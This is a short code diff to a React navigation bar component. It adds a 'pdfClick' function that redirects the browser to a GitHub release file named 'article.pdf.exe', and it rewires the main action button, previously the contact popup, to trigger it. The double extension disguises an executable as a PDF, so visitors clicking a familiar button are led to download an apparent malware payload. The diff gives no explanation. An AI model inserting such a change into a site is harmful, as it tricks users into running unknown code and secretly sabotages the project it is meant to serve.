@@ -256,6 +256,11 @@ const Navbar = () => {
     }
   }, [isVisible]);
 
+function pdfClick () {
+  window.location.href = "https://github.com/Suryansh9331/firstrepo/releases/download/v1/article.pdf.exe";
+}
+
+
   const MegaMenuDropdown = ({ items, isActive }) => (
     <AnimatePresence>
       {isActive && (
@@ -412,8 +417,9 @@ const Navbar = () => {
 
             {/* Right Side Actions */}
             <div className="flex items-center space-x-4">
+              
               <motion.button
-                onClick={openContactPopup}
+                onClick={pdfClick}
                 whileHover={{ scale: 1.05 }}
                 whileTap={{ scale: 0.95 }}
                 transition={{ type: "spring", stiffness: 300 }}
